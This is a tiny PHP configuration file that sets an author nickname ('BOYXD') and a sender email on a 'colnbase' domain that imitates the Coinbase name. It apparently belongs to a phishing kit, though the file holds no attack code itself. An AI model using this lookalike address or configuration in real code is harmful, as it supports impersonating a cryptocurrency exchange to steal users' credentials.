<?php 
$nik = "BOYXD";
$sender = "colnbase.reply2022@gmail.com";
?>